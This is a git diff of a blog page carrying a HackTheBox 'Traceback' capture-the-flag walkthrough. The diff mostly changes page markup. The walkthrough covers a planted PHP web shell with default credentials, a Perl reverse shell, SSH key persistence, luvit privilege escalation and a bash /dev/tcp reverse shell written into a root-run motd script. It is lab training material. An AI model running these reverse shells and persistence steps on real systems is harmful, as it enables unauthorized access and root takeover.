@@ -47,10 +47,6 @@
 			</li>
 			
 			<li>
-				<a href="/categories">Categories</a>
-			</li>
-			
-			<li>
 				<a href="/tags">Tags</a>
 			</li>
 			
@@ -63,30 +59,10 @@
 			<h1 class="title">HackTheBox Traceback Write Up w/o Metasploit</h1>
 			<div class="meta">Posted at &mdash; Aug 18, 2020</div>
 		</div>
-        
-            <div class="toc-container">
-                <div class="toc-post-title">Table Of Contents</div>
-                <nav id="TableOfContents">
-  <ul>
-    <li><a href="#reconnaissance">Reconnaissance</a></li>
-    <li><a href="#getting-user">Getting user</a>
-      <ul>
-        <li><a href="#smevkphp">Smevk.php</a></li>
-        <li><a href="#ssh-keygen">ssh-keygen</a></li>
-        <li><a href="#enumeration">Enumeration</a></li>
-        <li><a href="#luvit-privilege-escalation">Luvit privilege escalation</a></li>
-      </ul>
-    </li>
-    <li><a href="#getting-root">Getting Root</a></li>
-  </ul>
-</nav>
-            </div>
-        
 
 		<div class="markdown">
-            
-<p>Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access. If you have any questions you can find me on twitter @ajdintrejic.</p>
-<h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
+			<p>Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access. If you have any questions you can find me on twitter @ajdintrejic.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let’s run a quick nmap and full nmap scan in background:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#top 1000 ports
 sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.181
@@ -100,59 +76,32 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 <li>-oA: output OS detection, version detection, script scanning, and traceroute</li>
 <li>-p-: run on all ports</li>
 </ul>
-
-  <img src="/htb/traceback/nmap.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/nmap.png" alt=""></p>
 <p>We have a web page on port 80:</p>
-
-  <img src="/htb/traceback/port80.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/port80.png" alt=""></p>
 <p>There is no <code>robots.txt</code> , but there is a comment that might be useful.</p>
-
-  <img src="/htb/traceback/comment.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/comment.png" alt=""></p>
 <p>I’ll also ran gobuster:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.181 -x php,html -t 100
 </code></pre></div><p>But before it was finished I found out the next step. It also had a lot of errors (due to having a bad connection). So I won’t paste it here as it’s not important.</p>
-<h2 id="getting-user">Getting user<a class="anchor" href="#getting-user">#</a></h2>
+<h2 id="getting-user">Getting user</h2>
 <p>We can assume the hacker left in a shell by that comment. We can google that comment and find a repo containing some web shells.</p>
-
-  <img src="/htb/traceback/gitrepo.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/gitrepo.png" alt=""></p>
 <p>I tried opening all off then on 10.10.10.181/&lt;shell.php&gt; , I only got a login prompt for smevk.php.</p>
-<h3 id="smevkphp">Smevk.php<a class="anchor" href="#smevkphp">#</a></h3>
-
-  <img src="/htb/traceback/smevk.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<h3 id="smevkphp">Smevk.php</h3>
+<p><img src="/htb/traceback/smevk.png" alt=""></p>
 <p>Let&rsquo;s open that</p>
-
-  <img src="/htb/traceback/smevk2.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/smevk2.png" alt=""></p>
 <p>I got in with <code>admin:admin</code>.</p>
-
-  <img src="/htb/traceback/smevk3.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/smevk3.png" alt=""></p>
 <p>We have entered the system and we are webadmin now,</p>
-
-  <img src="/htb/traceback/smevk4.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/smevk4.png" alt=""></p>
 <p>now we should try to get a reverse shell so we can try to escalate privileges to user.</p>
 <h4 id="reverse-shell-as-webadmin">Reverse shell as webadmin</h4>
 <p>I couldn’t get it to work with nc but I did it with a perl reverse script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.</p>
 <p>Start a nc listener for reverse shell on your local machine (I used port 1233) with:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nc -lvnp 1233 
-</code></pre></div>
-  <img src="/htb/traceback/nc.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+</code></pre></div><p><img src="/htb/traceback/nc.png" alt=""></p>
 <p>On backdoor webpage execute the payload but make sure to edit the IP and port.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;
 </span><span style="color:#e6db74">$i=&#34;10.10.15.209&#34;;
@@ -163,18 +112,12 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 </span><span style="color:#e6db74">	open(STDERR,&#34;&gt;&amp;S&#34;);
 </span><span style="color:#e6db74">	exec(&#34;/bin/sh -i&#34;);
 </span><span style="color:#e6db74">};&#39;</span>
-</code></pre></div>
-  <img src="/htb/traceback/nc2.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+</code></pre></div><p><img src="/htb/traceback/nc2.png" alt=""></p>
 <p>After executing that command we will get a sh shell as webmin:</p>
-
-  <img src="/htb/traceback/nc3.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/nc3.png" alt=""></p>
 <p>We can cat /etc/passwd and see that we have to get into the sysadmin account.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
-</code></pre></div><h3 id="ssh-keygen">ssh-keygen<a class="anchor" href="#ssh-keygen">#</a></h3>
+</code></pre></div><h3 id="ssh-keygen">ssh-keygen</h3>
 <p>Let’s create out ssh keys while we’re here.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ssh-keygen
 Generating public/private rsa key pair.
@@ -201,16 +144,10 @@ The key&#39;s randomart image is:
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;\n\n&#34; &gt;&gt; authorized_keys
 cat id_rsa.pub &gt;&gt; authorized_keys
 </code></pre></div><p>We can ssh into the box now.</p>
-
-  <img src="/htb/traceback/nc4.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
-<h3 id="enumeration">Enumeration<a class="anchor" href="#enumeration">#</a></h3>
+<p><img src="/htb/traceback/nc4.png" alt=""></p>
+<h3 id="enumeration">Enumeration</h3>
 <p>Grab linPEAS.sh and LinEnum.sh and create a new folder with an http server running, on your local machine.</p>
-
-  <img src="/htb/traceback/python.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/python.png" alt=""></p>
 <p>After this we can grab the files and run them on the server. I created a /tmp/ajdin and pulled these files with wget :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget http://10.10.15.209:1232/LinEnum.sh
 wget http://10.10.15.209:1232/linpeas.sh
@@ -231,16 +168,10 @@ Contact me if you have any question.
 &lt;removed, not important&gt;[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release
 echo &#34;\nWelcome to Xh4H land \n&#34;
 </code></pre></div><p>but wait we’ve seen this text before, when we ssh’d into the box.</p>
-
-  <img src="/htb/traceback/ssh.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<p><img src="/htb/traceback/ssh.png" alt=""></p>
 <p>So can we get code execution here as root? Let’s first get sysadmin account so we can write to this file. We are left with SUID binary which has no entry in GTFOBin, but we can Google and see what it does.</p>
-<h3 id="luvit-privilege-escalation">Luvit privilege escalation<a class="anchor" href="#luvit-privilege-escalation">#</a></h3>
-
-  <img src="/htb/traceback/luvit.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+<h3 id="luvit-privilege-escalation">Luvit privilege escalation</h3>
+<p><img src="/htb/traceback/luvit.png" alt=""></p>
 <p>Wait so it has to do something with lua? If we check lua on GTFOBin, we can spawn a shell and escalate privileges:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">lua -e &#39;os.execute(&#34;/bin/sh&#34;)&#39;
 </code></pre></div><p>but we have luvit so let’s try</p>
@@ -251,13 +182,10 @@ sysadmin
 </code></pre></div><p>We can now get the flag and continue:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cat user.txt
 addd2ba938b3b4bf2e15374f413aee04
-</code></pre></div><h2 id="getting-root">Getting Root<a class="anchor" href="#getting-root">#</a></h2>
+</code></pre></div><h2 id="getting-root">Getting Root</h2>
 <p>Amazing. Now let’s get back to that /etc/upadate-motd.d/ dir as sysadmin and try to get code execution as root:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo “whoami” &gt;&gt; 00-header
-</code></pre></div>
-  <img src="/htb/traceback/root.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
-
-
+</code></pre></div><p><img src="/htb/traceback/root.png" alt=""></p>
 <p>For some reason you can’t make your ssh keys for this user. Anyway, we’ll insert the reverse shell bash payload into the 00-header .</p>
 <p>First start netcat listener on port 1250 nc -lvnp 1250 . Now insert the reverse shell payload:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.136/1250 0&gt;&amp;1&#39;&#34; &gt;&gt; 00-header
@@ -265,7 +193,6 @@ addd2ba938b3b4bf2e15374f413aee04
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@traceback:/# cat /root/root.txt
 2218cd7369604176712a79ad09dd5414
 </code></pre></div><p>Thanks for reading. If you have any questions feel free to reach out to me on Twitter @ajdintrejic.</p>
-
 
 		</div>
 
@@ -295,7 +222,7 @@ addd2ba938b3b4bf2e15374f413aee04
 		</div>
 	<div class="footer wrapper">
 	<nav class="nav">
-		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
+		<div> © All rights reserved |  <a href="https://github.com/vividvilla/ezhil">Ezhil theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
 	</nav>
 </div>
 
